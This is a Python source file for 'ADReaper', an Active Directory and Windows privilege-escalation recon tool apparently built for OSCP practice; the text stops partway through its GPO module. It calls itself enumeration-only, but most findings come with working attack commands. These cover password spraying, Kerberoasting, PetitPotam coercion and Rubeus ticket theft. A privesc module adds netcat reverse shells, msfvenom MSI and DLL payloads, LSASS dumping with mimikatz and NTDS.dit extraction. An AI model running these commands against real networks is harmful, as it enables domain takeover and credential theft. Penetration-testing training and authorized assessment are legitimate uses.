#!/usr/bin/env python3
"""
ADReaper — Active Directory & Windows Privilege Escalation Recon Tool
OSCP-compliant: enumeration only, no exploitation.
Author: Built for OSCP AD + PrivEsc enumeration workflow
"""

import argparse
import json
import os
import socket
import subprocess
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

# ── dependency check ──────────────────────────────────────────────────────────
def check_deps():
    missing = []
    try:
        from ldap3 import Server, Connection, ALL, NTLM, SASL, KERBEROS
    except ImportError:
        missing.append("ldap3")
    try:
        from rich.console import Console
        from rich.table import Table
        from rich.panel import Panel
        from rich.text import Text
        from rich import box
    except ImportError:
        missing.append("rich")
    if missing:
        print(f"[!] Missing packages: {', '.join(missing)}")
        print(f"    Install: pip3 install {' '.join(missing)} --break-system-packages")
        sys.exit(1)

check_deps()

from ldap3 import Server, Connection, ALL, NTLM, SIMPLE, ANONYMOUS
from ldap3.core.exceptions import LDAPException
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich import box as richbox

console = Console()

# ── colour helpers ─────────────────────────────────────────────────────────────
CRIT  = "[bold red]   [CRITICAL][/bold red]"
HIGH  = "[bold yellow]   [HIGH]    [/bold yellow]"
MED   = "[bold cyan]   [MEDIUM]  [/bold cyan]"
LOW   = "[dim]   [LOW]     [/dim]"
INFO  = "[green]   [INFO]    [/green]"
CMD   = "[bold magenta]   >[/bold magenta]"

# ── global results store ───────────────────────────────────────────────────────
results = {
    "meta": {},
    "domain": {},
    "users": [],
    "computers": [],
    "groups": [],
    "spn_users": [],
    "asrep_users": [],
    "unconstrained_users": [],
    "unconstrained_computers": [],
    "constrained": [],
    "dcsync_accounts": [],
    "dangerous_acls": [],
    "writable_gpos": [],
    "trusts": [],
    "password_in_desc": [],
    "stale_computers": [],
    "delegation_summary": [],
    "privesc_checks": {},
    "findings": [],
    "commands": [],
}
results_lock = threading.Lock()

def add_finding(severity, title, detail, commands=None):
    with results_lock:
        results["findings"].append({
            "severity": severity,
            "title": title,
            "detail": detail,
            "commands": commands or [],
        })

# ═════════════════════════════════════════════════════════════════════════════
# LDAP CONNECTION
# ═════════════════════════════════════════════════════════════════════════════

def get_ldap_connection(args):
    server = Server(args.dc_ip, get_info=ALL, connect_timeout=10)
    try:
        if args.password:
            conn = Connection(
                server,
                user=f"{args.domain}\\{args.user}" if args.user else None,
                password=args.password,
                authentication=NTLM,
                auto_bind=True,
            )
        elif args.hash:
            # Pass-the-hash via NTLM (ldap3 supports nt:lm format)
            nt_hash = args.hash if ":" not in args.hash else args.hash.split(":")[1]
            conn = Connection(
                server,
                user=f"{args.domain}\\{args.user}",
                password=f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}",
                authentication=NTLM,
                auto_bind=True,
            )
        else:
            conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)
        return conn
    except LDAPException as e:
        console.print(f"[red][!] LDAP connection failed: {e}[/red]")
        return None


def get_base_dn(domain):
    return ",".join(f"DC={part}" for part in domain.split("."))


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 1 — DOMAIN BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def module_domain_info(conn, base_dn, args):
    console.print("[cyan]  → Domain baseline...[/cyan]")
    try:
        conn.search(
            base_dn,
            "(objectClass=domain)",
            attributes=[
                "name", "distinguishedName", "whenCreated",
                "minPwdLength", "pwdHistoryLength", "lockoutThreshold",
                "maxPwdAge", "ms-DS-MachineAccountQuota",
                "domainFunctionality", "forestFunctionality",
            ],
        )
        if conn.entries:
            e = conn.entries[0]
            def attr(name):
                try:
                    v = getattr(e, name).value
                    return v if v is not None else "N/A"
                except Exception:
                    return "N/A"

            domain_info = {
                "name": attr("name"),
                "dn": attr("distinguishedName"),
                "min_pwd_length": attr("minPwdLength"),
                "pwd_history": attr("pwdHistoryLength"),
                "lockout_threshold": attr("lockoutThreshold"),
                "max_pwd_age": attr("maxPwdAge"),
                "machine_account_quota": attr("ms-DS-MachineAccountQuota"),
            }
            with results_lock:
                results["domain"] = domain_info

            # flag weak password policy
            try:
                thresh = int(str(attr("lockoutThreshold")))
                min_len = int(str(attr("minPwdLength")))
                maq = int(str(attr("ms-DS-MachineAccountQuota")))
            except Exception:
                thresh = 999; min_len = 0; maq = 10

            if thresh == 0:
                add_finding("HIGH", "No account lockout policy",
                    "Lockout threshold = 0 — password spraying is safe.",
                    [f"kerbrute passwordspray users.txt <PASSWORD> --dc {args.dc_ip} -d {args.domain}",
                     f"crackmapexec smb {args.dc_ip} -u users.txt -p passwords.txt --no-bruteforce"])
            if min_len < 8:
                add_finding("MEDIUM", f"Weak minimum password length ({min_len})",
                    "Passwords may be short and easy to crack.",
                    [f"hashcat -m 13100 kerberoast_hashes.txt rockyou.txt"])
            if maq > 0:
                add_finding("MEDIUM", f"Machine Account Quota = {maq}",
                    "Regular users can add machines to the domain — enables RBCD attacks.",
                    [f"addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Fake01Pass!' "
                     f"-dc-ip {args.dc_ip} {args.domain}/{args.user}"])

        # Get DCs
        conn.search(base_dn, "(userAccountControl:1.2.840.113556.1.4.803:=8192)",
                    attributes=["dNSHostName", "operatingSystem"])
        dcs = []
        for e in conn.entries:
            dcs.append({
                "hostname": str(getattr(e, "dNSHostName", "?")),
                "os": str(getattr(e, "operatingSystem", "?")),
            })
        with results_lock:
            results["domain"]["domain_controllers"] = dcs

    except Exception as ex:
        console.print(f"[red]  [!] Domain info error: {ex}[/red]")


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 2 — USER ENUMERATION
# ═════════════════════════════════════════════════════════════════════════════

def module_users(conn, base_dn, args):
    console.print("[cyan]  → User enumeration...[/cyan]")
    try:
        conn.search(
            base_dn,
            "(&(objectCategory=person)(objectClass=user))",
            attributes=[
                "sAMAccountName", "userAccountControl", "adminCount",
                "pwdLastSet", "lastLogonTimestamp", "description",
                "memberOf", "servicePrincipalName", "mail",
                "userPrincipalName", "whenCreated",
            ],
        )

        uac_disabled   = 2
        uac_nopreauth  = 4194304
        uac_nodelegation = 1048576
        uac_passnotreqd = 32

        spn_users, asrep_users, desc_users = [], [], []

        for e in conn.entries:
            sam = str(getattr(e, "sAMAccountName", "?"))
            try:
                uac = int(getattr(e, "userAccountControl", 0).value or 0)
            except Exception:
                uac = 0
            admin = getattr(e, "adminCount", None)
            admin = int(admin.value) if admin and admin.value else 0
            desc  = str(getattr(e, "description", ""))
            spns  = getattr(e, "servicePrincipalName", None)
            spns  = spns.values if spns else []
            pwd_last = getattr(e, "pwdLastSet", None)

            user_rec = {
                "name": sam,
                "uac": uac,
                "admin": admin,
                "description": desc,
                "spns": [str(s) for s in spns],
                "pwd_last_set": str(pwd_last.value) if pwd_last and pwd_last.value else "Never",
            }
            with results_lock:
                results["users"].append(user_rec)

            # ASREPRoastable (DONT_REQ_PREAUTH)
            if uac & uac_nopreauth and not (uac & uac_disabled):
                with results_lock:
                    results["asrep_users"].append(sam)
                asrep_users.append(sam)

            # Kerberoastable (has SPN, not a machine account, enabled)
            if spns and not sam.endswith("$") and not (uac & uac_disabled):
                with results_lock:
                    results["spn_users"].append({"name": sam, "spns": [str(s) for s in spns]})
                spn_users.append(sam)

            # Password in description
            if desc and any(k in desc.lower() for k in ["pass", "pwd", "cred", "secret", "key"]):
                with results_lock:
                    results["password_in_desc"].append({"user": sam, "description": desc})
                desc_users.append(sam)

            # PASSWD_NOTREQD
            if uac & uac_passnotreqd and not (uac & uac_disabled):
                add_finding("MEDIUM", f"User {sam} has PASSWD_NOTREQD flag",
                    "Blank password may be set on this account.",
                    [f"crackmapexec smb {args.dc_ip} -u '{sam}' -p '' -d {args.domain}"])

        if asrep_users:
            cmds = [f"GetNPUsers.py {args.domain}/{args.user} -dc-ip {args.dc_ip} -no-pass -usersfile asrep_users.txt -format hashcat -outputfile asrep_hashes.txt"]
            cmds += [f"# Crack: hashcat -m 18200 asrep_hashes.txt rockyou.txt"]
            add_finding("HIGH", f"ASREPRoastable accounts found ({len(asrep_users)})",
                f"Accounts: {', '.join(asrep_users)}", cmds)

        if spn_users:
            spn_detail = "\n".join(
                f"    {u['name']}: {', '.join(u['spns'])}"
                for u in results["spn_users"]
            )
            cmds = [
                f"GetUserSPNs.py {args.domain}/{args.user}:{args.password or '<password>'} -dc-ip {args.dc_ip} -request -outputfile kerberoast_hashes.txt",
                f"# Crack RC4:  hashcat -m 13100 kerberoast_hashes.txt rockyou.txt",
                f"# Crack AES:  hashcat -m 19700 kerberoast_hashes.txt rockyou.txt",
            ]
            add_finding("HIGH", f"Kerberoastable accounts found ({len(spn_users)})",
                f"Service accounts with SPNs:\n{spn_detail}", cmds)

        if desc_users:
            for u in results["password_in_desc"]:
                add_finding("CRITICAL", f"Potential credential in description: {u['user']}",
                    f"Description: {u['description']}", [])

    except Exception as ex:
        console.print(f"[red]  [!] User enum error: {ex}[/red]")


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 3 — COMPUTER ENUMERATION
# ═════════════════════════════════════════════════════════════════════════════

def module_computers(conn, base_dn, args):
    console.print("[cyan]  → Computer enumeration...[/cyan]")
    try:
        conn.search(
            base_dn,
            "(objectClass=computer)",
            attributes=[
                "dNSHostName", "operatingSystem", "operatingSystemVersion",
                "lastLogonTimestamp", "userAccountControl", "whenCreated",
                "servicePrincipalName",
            ],
        )

        uac_unconstrained = 524288
        uac_disabled = 2
        now = datetime.now(timezone.utc)
        stale_threshold_days = 90
        LDAP_TS_OFFSET = 116444736000000000  # seconds between 1601 and 1970

        for e in conn.entries:
            hostname = str(getattr(e, "dNSHostName", "unknown"))
            os_name  = str(getattr(e, "operatingSystem", "unknown"))
            os_ver   = str(getattr(e, "operatingSystemVersion", ""))
            try:
                uac = int(getattr(e, "userAccountControl", 0).value or 0)
            except Exception:
                uac = 0
            spns = getattr(e, "servicePrincipalName", None)
            spns = spns.values if spns else []

            # parse lastLogonTimestamp
            llt = getattr(e, "lastLogonTimestamp", None)
            stale = False
            days_since = None
            try:
                llt_val = llt.value
                if llt_val and hasattr(llt_val, "timestamp"):
                    days_since = (now - llt_val.replace(tzinfo=timezone.utc)).days
                    stale = days_since > stale_threshold_days
            except Exception:
                pass

            rec = {
                "hostname": hostname,
                "os": os_name,
                "os_version": os_ver,
                "uac": uac,
                "stale": stale,
                "days_since_logon": days_since,
                "spns": [str(s) for s in spns],
            }
            with results_lock:
                results["computers"].append(rec)

            if stale:
                with results_lock:
                    results["stale_computers"].append(hostname)
                add_finding("MEDIUM", f"Stale computer: {hostname}",
                    f"Last logon: {days_since} days ago. OS: {os_name}. Likely unpatched.",
                    [f"nmap -sV --script smb-vuln* -p 445 {hostname}",
                     f"crackmapexec smb {hostname} -u '{args.user}' -p '{args.password or '<pass>'}' --shares"])

            # Unconstrained delegation
            if uac & uac_unconstrained and hostname and "dc" not in hostname.lower():
                with results_lock:
                    results["unconstrained_computers"].append(hostname)
                add_finding("HIGH", f"Unconstrained delegation: {hostname}",
                    f"Any user authenticating to {hostname} will send their TGT. Coerce DC auth with PrinterBug/PetitPotam.",
                    [f"# Step 1 — monitor for TGTs on compromised host:",
                     f"Rubeus.exe monitor /interval:5 /nowrap",
                     f"# Step 2 — coerce DC authentication:",
                     f"PetitPotam.py -u '{args.user}' -p '{args.password or '<pass>'}' <ATTACKER_IP> <DC_HOSTNAME>",
                     f"# Step 3 — inject captured TGT:",
                     f"Rubeus.exe ptt /ticket:<base64_TGT>"])

            # Windows 7 / 2003 / XP — likely EternalBlue
            if any(x in os_name for x in ["Windows 7", "Windows XP", "2003", "Vista", "2008"]):
                add_finding("HIGH", f"Legacy OS detected: {hostname}",
                    f"{os_name} — likely missing critical patches (EternalBlue etc.)",
                    [f"nmap -sV --script smb-vuln-ms17-010 -p 445 {hostname}"])

    except Exception as ex:
        console.print(f"[red]  [!] Computer enum error: {ex}[/red]")


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 4 — GROUP ENUMERATION
# ═════════════════════════════════════════════════════════════════════════════

def module_groups(conn, base_dn, args):
    console.print("[cyan]  → Group enumeration...[/cyan]")
    try:
        conn.search(
            base_dn,
            "(objectClass=group)",
            attributes=["sAMAccountName", "adminCount", "member", "managedBy", "distinguishedName"],
        )
        priv_groups = [
            "Domain Admins", "Enterprise Admins", "Schema Admins",
            "Backup Operators", "Account Operators", "Print Operators",
            "Server Operators", "DNS Admins", "Remote Management Users",
            "Hyper-V Administrators",
        ]
        for e in conn.entries:
            name = str(getattr(e, "sAMAccountName", ""))
            admin = getattr(e, "adminCount", None)
            admin = int(admin.value) if admin and admin.value else 0
            members_raw = getattr(e, "member", None)
            members = members_raw.values if members_raw else []
            managed_by = str(getattr(e, "managedBy", ""))

            rec = {
                "name": name,
                "admin_count": admin,
                "member_count": len(members),
                "managed_by": managed_by,
            }
            with results_lock:
                results["groups"].append(rec)

            if name in priv_groups and members:
                member_names = [m.split(",")[0].replace("CN=", "") for m in members]
                add_finding("INFO", f"Privileged group members: {name}",
                    f"Members: {', '.join(member_names[:10])}",
                    [f"Get-DomainGroupMember -Identity '{name}' -Recurse",
                     f"net group '{name}' /domain"])

    except Exception as ex:
        console.print(f"[red]  [!] Group enum error: {ex}[/red]")


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 5 — ACL / DCSYNC CHECKS
# ═════════════════════════════════════════════════════════════════════════════

def module_acls(conn, base_dn, args):
    console.print("[cyan]  → ACL / DCSync rights...[/cyan]")
    try:
        from ldap3 import SUBTREE
        from ldap3.protocol.microsoft import security_descriptor_control

        # Get domain object security descriptor
        ctrl = security_descriptor_control(sdflags=0x04)
        conn.search(
            base_dn,
            "(objectClass=domain)",
            attributes=["nTSecurityDescriptor"],
            controls=ctrl,
        )

        # Check via LDAP for Replication rights (simpler — look for accounts with adminSDHolder)
        # Also find GenericAll / WriteDacl on domain admins
        # Simplified: check who has adminCount and flag for manual review
        conn.search(
            base_dn,
            "(&(objectCategory=person)(objectClass=user)(adminCount=1))",
            attributes=["sAMAccountName", "memberOf"],
        )
        admin_users = [str(e.sAMAccountName) for e in conn.entries]

        add_finding("INFO", f"AdminCount=1 accounts ({len(admin_users)})",
            f"Protected by AdminSDHolder. Review ACLs manually: {', '.join(admin_users)}",
            [f"# Check DCSync rights:",
             f"Get-ObjectACL 'DC={args.domain.split('.')[0]},DC={args.domain.split('.')[1] if '.' in args.domain else 'local'}' -ResolveGUIDs | "
             f"? {{ ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')}} | Select SecurityIdentifier",
             f"# Impacket — check from Linux:",
             f"dacledit.py -action read -target-dn '{base_dn}' {args.domain}/{args.user}:{args.password or '<pass>'} -dc-ip {args.dc_ip}"])

        # Find users with dangerous DACLs using secretsdump check
        add_finding("INFO", "DACL enumeration — run manually for full picture",
            "Automated DACL parsing requires PowerView/BloodHound for complete results.",
            [f"# BloodHound ingestion (most complete):",
             f"bloodhound-python -u '{args.user}' -p '{args.password or '<pass>'}' -d {args.domain} -dc {args.dc_ip} --zip -c All",
             f"# PowerView — find interesting ACLs:",
             f"Find-InterestingDomainAcl -Domain {args.domain} -ResolveGUIDs | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights"])

    except Exception as ex:
        console.print(f"[red]  [!] ACL enum error: {ex}[/red]")


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 6 — CONSTRAINED DELEGATION
# ═════════════════════════════════════════════════════════════════════════════

def module_delegation(conn, base_dn, args):
    console.print("[cyan]  → Delegation checks...[/cyan]")
    try:
        # Constrained delegation — users
        conn.search(
            base_dn,
            "(&(objectCategory=person)(objectClass=user)(msDS-AllowedToDelegateTo=*))",
            attributes=["sAMAccountName", "msDS-AllowedToDelegateTo", "userAccountControl"],
        )
        for e in conn.entries:
            sam = str(e.sAMAccountName)
            delegateto = getattr(e, "msDS-AllowedToDelegateTo", None)
            targets = delegateto.values if delegateto else []
            with results_lock:
                results["constrained"].append({"name": sam, "targets": [str(t) for t in targets]})
            add_finding("HIGH", f"Constrained delegation user: {sam}",
                f"Can impersonate any user to: {', '.join(str(t) for t in targets)}",
                [f"getST.py -spn '{targets[0] if targets else '<SPN>'}' "
                 f"-impersonate Administrator -dc-ip {args.dc_ip} {args.domain}/{sam}",
                 f"# Then: export KRB5CCNAME=./Administrator.ccache",
                 f"psexec.py -k -no-pass {args.domain}/administrator@<TARGET>"])

        # Constrained delegation — computers
        conn.search(
            base_dn,
            "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))",
            attributes=["dNSHostName", "msDS-AllowedToDelegateTo"],
        )
        for e in conn.entries:
            hn = str(getattr(e, "dNSHostName", "?"))
            delegateto = getattr(e, "msDS-AllowedToDelegateTo", None)
            targets = delegateto.values if delegateto else []
            add_finding("HIGH", f"Constrained delegation computer: {hn}",
                f"Can impersonate any user to: {', '.join(str(t) for t in targets)}",
                [f"# Get machine hash with Mimikatz, then S4U:",
                 f"Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:'{targets[0] if targets else '<SPN>'}' "
                 f"/user:{hn.split('.')[0]}$ /rc4:<NTLM_HASH> /ptt"])

        # Unconstrained delegation — users (computers handled in module_computers)
        conn.search(
            base_dn,
            "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
            attributes=["sAMAccountName"],
        )
        for e in conn.entries:
            sam = str(e.sAMAccountName)
            with results_lock:
                results["unconstrained_users"].append(sam)
            add_finding("HIGH", f"Unconstrained delegation user account: {sam}",
                "Service account with unconstrained delegation — any TGT sent to this service is extractable.",
                [f"Rubeus.exe monitor /interval:5 /nowrap",
                 f"Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap"])

    except Exception as ex:
        console.print(f"[red]  [!] Delegation enum error: {ex}[/red]")


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 7 — DOMAIN TRUSTS
# ═════════════════════════════════════════════════════════════════════════════

def module_trusts(conn, base_dn, args):
    console.print("[cyan]  → Domain trusts...[/cyan]")
    try:
        conn.search(
            base_dn,
            "(objectClass=trustedDomain)",
            attributes=["name", "trustDirection", "trustType", "trustAttributes"],
        )
        directions = {0: "Disabled", 1: "Inbound", 2: "Outbound", 3: "Bidirectional"}
        for e in conn.entries:
            name = str(getattr(e, "name", "?"))
            direction_code = int(getattr(e, "trustDirection", 0).value or 0)
            direction = directions.get(direction_code, "Unknown")
            trust_attr = int(getattr(e, "trustAttributes", 0).value or 0)
            transitive = not (trust_attr & 0x4)

            rec = {"domain": name, "direction": direction, "transitive": transitive}
            with results_lock:
                results["trusts"].append(rec)

            if direction in ["Outbound", "Bidirectional"]:
                add_finding("MEDIUM", f"Trust to external domain: {name} ({direction})",
                    f"{'Transitive' if transitive else 'Non-transitive'} trust — enumerate for cross-domain attack paths.",
                    [f"Get-DomainUser -SPN -Domain {name} | select samaccountname,serviceprincipalname",
                     f"Get-DomainForeignGroupMember -Domain {name}",
                     f"# Check for SID history abuse if trust attributes allow it"])

    except Exception as ex:
        console.print(f"[red]  [!] Trust enum error: {ex}[/red]")


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 8 — SMB / HOST REACHABILITY (subprocess)
# ═════════════════════════════════════════════════════════════════════════════

def module_smb(args):
    console.print("[cyan]  → SMB host checks...[/cyan]")
    try:
        dc_ip = args.dc_ip
        creds = f"-u '{args.user}' -p '{args.password or ''}'" if args.user else ""

        add_finding("INFO", "SMB enumeration — run these commands",
            "CrackMapExec provides quick SMB surface for the DC and discovered hosts.",
            [f"crackmapexec smb {dc_ip} {creds} --shares",
             f"crackmapexec smb {dc_ip} {creds} --users",
             f"crackmapexec smb {dc_ip} {creds} --groups",
             f"crackmapexec smb {dc_ip} {creds} --sessions",
             f"crackmapexec smb {dc_ip} {creds} --loggedon-users",
             f"crackmapexec smb {dc_ip} {creds} -M spider_plus   # enumerate all shares recursively",
             f"smbmap -H {dc_ip} -u '{args.user}' -p '{args.password or '<pass>'}'"])
    except Exception as ex:
        console.print(f"[red]  [!] SMB module error: {ex}[/red]")


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 9 — KERBRUTE USER ENUM (external tool check)
# ═════════════════════════════════════════════════════════════════════════════

def module_kerberos_tools(args):
    console.print("[cyan]  → Kerberos attack surface...[/cyan]")
    add_finding("INFO", "Kerberos enumeration commands",
        "Use these to enumerate and attack Kerberos from Kali.",
        [f"# User enumeration (safe — no lockout):",
         f"kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc {args.dc_ip} -d {args.domain}",
         f"# Password spray (CAREFUL — check lockout policy first):",
         f"kerbrute passwordspray users.txt '{args.domain}2024!' --dc {args.dc_ip} -d {args.domain}",
         f"# Kerberoast all SPNs:",
         f"GetUserSPNs.py {args.domain}/{args.user}:{args.password or '<pass>'} -dc-ip {args.dc_ip} -request",
         f"# ASREPRoast (no creds needed):",
         f"GetNPUsers.py {args.domain}/ -dc-ip {args.dc_ip} -no-pass -usersfile users.txt -format hashcat"])


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 10 — WINDOWS PRIVESC CHECKS (against compromised host)
# ═════════════════════════════════════════════════════════════════════════════

def module_windows_privesc(args):
    console.print("[cyan]  → Windows PrivEsc surface...[/cyan]")

    target = args.target_host or args.dc_ip

    privesc = {
        "seimpersonate": {
            "title": "SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege",
            "severity": "CRITICAL",
            "detail": "If the compromised account is a service/IIS account with this privilege → instant SYSTEM via potato attacks.",
            "check_cmds": ["whoami /priv | findstr /i SeImpersonate"],
            "exploit_cmds": [
                f"# PrintSpoofer (Win10/Server2019+):",
                f".\\PrintSpoofer64.exe -i -c cmd",
                f"# GodPotato (universal):",
                f".\\GodPotato-NET4.exe -cmd 'nc {args.lhost or '<LHOST>'} {args.lport or 4444} -e cmd'",
                f"# JuicyPotatoNG:",
                f".\\JuicyPotatoNG.exe -t * -p C:\\Windows\\System32\\cmd.exe",
            ],
        },
        "always_install_elevated": {
            "title": "AlwaysInstallElevated MSI escalation",
            "severity": "HIGH",
            "detail": "Both HKLM and HKCU keys must be 1. If set, any user can install MSI as SYSTEM.",
            "check_cmds": [
                "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            ],
            "exploit_cmds": [
                f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={args.lhost or '<LHOST>'} LPORT={args.lport or 4444} -f msi -o evil.msi",
                f"msiexec /quiet /qn /i evil.msi",
            ],
        },
        "unquoted_service_paths": {
            "title": "Unquoted service paths",
            "severity": "HIGH",
            "detail": "Service paths with spaces and no quotes — place malicious binary in writable segment.",
            "check_cmds": [
                'wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "c:\\windows"',
                'Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch \'"\' -and $_.PathName -match \' \' -and $_.StartMode -eq \'Auto\'}',
            ],
            "exploit_cmds": [
                "# Copy malicious exe to the unquoted path segment (requires write access)",
                "copy evil.exe 'C:\\Program Files\\Vulnerable\\Serv.exe'",
                "sc stop <service> && sc start <service>",
            ],
        },
        "weak_service_permissions": {
            "title": "Weak service binary permissions",
            "severity": "HIGH",
            "detail": "If service binary is writable by current user, replace with malicious payload.",
            "check_cmds": [
                "accesschk.exe -uwcqv \"Users\" * /accepteula",
                "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
                "icacls \"C:\\path\\to\\service.exe\"",
            ],
            "exploit_cmds": [
                "copy evil.exe 'C:\\Path\\To\\service.exe'",
                "net stop <service> && net start <service>",
            ],
        },
        "scheduled_tasks": {
            "title": "Writable scheduled task scripts",
            "severity": "HIGH",
            "detail": "Tasks running as SYSTEM with user-writable scripts are instant privilege escalation.",
            "check_cmds": [
                "schtasks /query /fo LIST /v | findstr /i 'task name\\|run as\\|task to run'",
                "Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq 'Highest'} | select TaskName,TaskPath",
                "icacls \"C:\\path\\to\\task_script.ps1\"",
            ],
            "exploit_cmds": [
                f"# Add reverse shell to writable task script:",
                f"echo 'powershell -e <BASE64_REVSHELL>' >> C:\\Scripts\\task.ps1",
            ],
        },
        "sebdebugprivilege": {
            "title": "SeDebugPrivilege — LSASS dump",
            "severity": "CRITICAL",
            "detail": "SeDebugPrivilege allows dumping LSASS → extract plaintext creds and NTLM hashes.",
            "check_cmds": ["whoami /priv | findstr SeDebug"],
            "exploit_cmds": [
                "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
                "mimikatz # sekurlsa::minidump lsass.dmp",
                "mimikatz # sekurlsa::logonpasswords",
                f"# Or via Task Manager: Details → lsass.exe → Create dump file",
            ],
        },
        "setakeownership": {
            "title": "SeTakeOwnershipPrivilege — read protected files",
            "severity": "HIGH",
            "detail": "Allows taking ownership of files like SAM, NTDS.dit, web.config containing creds.",
            "check_cmds": ["whoami /priv | findstr SeTakeOwnership"],
            "exploit_cmds": [
                "takeown /f 'C:\\Windows\\repair\\SAM'",
                "icacls 'C:\\Windows\\repair\\SAM' /grant <username>:F",
                "# Target files: SAM, SYSTEM, web.config, *.kdbx",
            ],
        },
        "sebackupprivilege": {
            "title": "SeBackupPrivilege — NTDS.dit extraction",
            "severity": "CRITICAL",
            "detail": "Backup Operators group. Can copy NTDS.dit → full domain credential dump.",
            "check_cmds": [
                "whoami /priv | findstr SeBackup",
                "net localgroup 'Backup Operators'",
            ],
            "exploit_cmds": [
                "# Use diskshadow to snapshot C: then copy NTDS.dit",
                "diskshadow /s shadow.txt",
                "Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit",
                "reg save HKLM\\SYSTEM SYSTEM.SAV",
                f"secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL",
            ],
        },
        "dll_hijacking": {
            "title": "DLL hijacking opportunities",
            "severity": "MEDIUM",
            "detail": "Applications loading DLLs from user-writable paths allow code execution.",
            "check_cmds": [
                "# Run Process Monitor on target, filter: Result=NAME NOT FOUND, Path ends with .dll",
                "# Look for missing DLLs in writable dirs",
            ],
            "exploit_cmds": [
                f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={args.lhost or '<LHOST>'} LPORT={args.lport or 4444} -f dll -o malicious.dll",
                "# Copy to the path where the app searches for the missing DLL",
            ],
        },
        "credential_hunting": {
            "title": "Credential hunting locations",
            "severity": "HIGH",
            "detail": "Common locations storing cleartext credentials on Windows hosts.",
            "check_cmds": [
                "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
                "reg query HKLM /f password /t REG_SZ /s",
                "reg query HKCU /f password /t REG_SZ /s",
                "dir /s /b *pass* *cred* *vnc* *.config 2>nul",
                "findstr /si \"password\" *.txt *.ini *.config *.xml 2>nul",
                "# mRemoteNG creds: %APPDATA%\\mRemoteNG\\confCons.xml",
                ".\\lazagne.exe all",
                "Invoke-SessionGopher -Thorough",
            ],
            "exploit_cmds": [],
        },
        "winpeas": {
            "title": "WinPEAS — automated privesc enumeration",
            "severity": "INFO",
            "detail": "Run WinPEAS first on any compromised Windows host for a complete picture.",
            "check_cmds": [],
            "exploit_cmds": [
                f"# Transfer WinPEAS to target:",
                f"certutil.exe -urlcache -split -f http://{args.lhost or '<LHOST>'}:8000/winPEASx64.exe winPEASx64.exe",
                f"# Or via SMB:",
                f"impacket-smbserver share . -smb2support",
                f"copy \\\\{args.lhost or '<LHOST>'}\\share\\winPEASx64.exe .",
                f"# Run:",
                f".\\winPEASx64.exe",
                f".\\winPEASx64.exe quiet          # less verbose",
                f".\\winPEASx64.exe servicesinfo   # focus on services",
                f"# PowerUp:",
                f"Import-Module .\\PowerUp.ps1; Invoke-AllChecks",
                f"# SharpUp (C# equiv):",
                f".\\SharpUp.exe audit",
            ],
        },
        "kernel_exploits": {
            "title": "Kernel exploit check",
            "severity": "HIGH",
            "detail": "Check for known kernel exploits based on Windows version and missing patches.",
            "check_cmds": [
                "systeminfo | findstr /i 'os version\\|build\\|hotfix'",
                "wmic qfe list",
                f"# Run Sherlock or WES-NG offline against systeminfo output",
            ],
            "exploit_cmds": [
                f"# WES-NG (on Kali):",
                f"systeminfo > sysinfo.txt  # on target",
                f"python3 wes.py sysinfo.txt -i 'Elevation of Privilege'",
                f"# Sherlock (on target):",
                f"Import-Module .\\Sherlock.ps1; Find-AllVulns",
                f"# Notable CVEs: PrintNightmare (CVE-2021-34527), HiveNightmare (CVE-2021-36934)",
            ],
        },
        "token_impersonation": {
            "title": "Token impersonation / MSSQL xp_cmdshell path",
            "severity": "HIGH",
            "detail": "SQL server service accounts commonly have SeImpersonatePrivilege. xp_cmdshell → potato attack.",
            "check_cmds": [
                f"# Connect to MSSQL:",
                f"mssqlclient.py {args.user}@{target} -windows-auth",
                "SQL> SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')",
                "SQL> enable_xp_cmdshell",
                "SQL> xp_cmdshell whoami /priv",
            ],
            "exploit_cmds": [
                f"SQL> xp_cmdshell 'c:\\tools\\PrintSpoofer64.exe -c \"nc {args.lhost or '<LHOST>'} {args.lport or 4444} -e cmd\"'",
            ],
        },
    }

    with results_lock:
        results["privesc_checks"] = privesc


# ═════════════════════════════════════════════════════════════════════════════
# MODULE 11 — GPO ENUMERATION
# ═════════════════════════════════════════════════════════════════════════════

def module_gpo(conn, base_dn, args):
    console.print("[cyan]  → GPO enumeration...[/cyan]")
    try:
        conn.search(
            base_dn,
            "(objectClass=groupPolicyContainer)",
            attributes=["displayName", "gPCFileSysPath", "distinguishedName"],
        )
        gpos = []
        for e in conn.entries:
